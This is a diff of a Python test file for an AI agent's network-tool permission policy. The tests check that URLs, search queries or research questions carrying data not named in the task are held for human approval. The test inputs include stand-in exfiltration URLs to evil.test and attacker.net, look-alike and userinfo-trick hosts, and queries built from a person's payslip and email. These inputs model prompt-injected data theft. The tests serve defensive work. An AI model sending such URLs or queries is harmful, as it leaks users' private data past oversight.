@@ -333,17 +333,30 @@ def test_an_approver_moves_another_persons_run_as_that_person_is_now(tmp_path, m
     assert decide(rid, h).json()["status"] == "done" and seen == [[]]      # ran with no hr_admin
 
 
-def test_network_steps_that_name_something_the_task_did_not_wait_for_a_person():
-    """KAN-69 SV2-01: injected text must not carry data out through the URL of a READ tool."""
+def test_network_steps_wait_for_a_person_unless_the_task_already_holds_what_they_send():
+    """KAN-69 SV2-01: injected text must not carry data out through a URL, a search query or a research question."""
     from velaris.api.flow_policy import permit_for
-    permit = permit_for("summarise https://docs.example.com/guide?page=2 for me", lambda n: False)
-    t = "ADVANCED_SEARCH_ENGINE.read_page"
-    assert permit(t, {"url": "https://docs.example.com/guide?page=2"}) == "allow"
-    assert permit(t, {"url": "https://evil.test/?d=payslip+text"}) == "approve"       # a host the task did not name
-    assert permit(t, {"url": "https://docs.example.com/?d=salary+4200"}) == "approve"   # the task's host, a query it did not
-    assert permit(t, {"url": "https://docs.example.com/guide?page=2", "x": ["//evil.test/a"]}) == "approve"   # nested
-    assert permit("DEMO.whoami", {"note": "https://evil.test/x"}) == "allow"           # not a network tool
-    assert permit_for("x", lambda n: True)(t, {}) == "approve"                           # the tool's own rule still applies
+    task = "summarise https://docs.example.com/guide?page=2 and https://münchen.example/a for me, then search for quarterly report template"
+    permit = permit_for(task, lambda n: False)
+    page, search, research = "ADVANCED_SEARCH_ENGINE.read_page", "ADVANCED_SEARCH_ENGINE.web_search", "AUTONOMOUS_RESEARCH_ENGINE.research"
+    assert permit(page, {"url": "https://docs.example.com/guide?page=2"}) == "allow"
+    assert permit(page, {"url": "HTTPS://Docs.Example.com:443/guide?page=2#top"}) == "allow"      # same URL, normalised
+    assert permit(page, {"url": "https://xn--mnchen-3ya.example/a"}) == "allow"                     # punycode of the task's host
+    for bad in ("https://evil.test/?d=payslip+text",                                              # a host the task did not name
+                "https://notdocs.example.com/guide?page=2", "https://docs.example.com.attacker.net/guide?page=2",   # look-alike hosts
+                "https://docs.example.com@attacker.net/guide?page=2", "https://attacker.net/https://docs.example.com/guide?page=2",
+                "https://docs.example.com/?d=salary+4200",                                          # task's host, another query
+                "https://docs.example.com/guide", "https://docs.example.com/guide?page=2&d=x",     # path/query differ
+                "https://xn--mnchen-3ya.example/b", "https://mu\u0300nchen.example/a", "ftp://docs.example.com/guide?page=2"):
+        assert permit(page, {"url": bad}) == "approve", bad
+    assert permit(page, {"url": "https://docs.example.com/guide?page=2", "x": ["//evil.test/a"]}) == "approve"   # nested
+    assert permit(page, {}) == "approve" and permit(page, {"url": "no url here"}) == "approve"       # read_page without a URL
+    assert permit(search, {"query": "quarterly report   TEMPLATE"}) == "allow"                       # the task's own words
+    assert permit(search, {"query": "payslip of asha rao net 4200"}) == "approve"                  # built from retrieved data
+    assert permit(search, {"query": "quarterly report template asha.rao@example.com"}) == "approve"
+    assert permit(research, {"question": "what is asha's salary"}) == "approve"
+    assert permit("DEMO.whoami", {"note": "https://evil.test/x"}) == "allow"                         # not a network tool
+    assert permit_for("x", lambda n: True)(page, {}) == "approve"                                    # the tool's own rule still applies
 
 
 def test_dot_segments_in_a_path_are_refused_and_no_route_reads_identity_from_the_query(tmp_path):
@@ -361,3 +374,4 @@ def test_dot_segments_in_a_path_are_refused_and_no_route_reads_identity_from_the
     import re
     src = "\n".join(p.read_text() for p in pathlib.Path(__file__).parents[1].rglob("*.py") if "tests" not in p.parts)
     assert not re.findall(r"query_params(?:\.get\(|\[)\s*[\"'](?:org|org_id|user_id|as_user|caller|employee_id)[\"']", src)
+
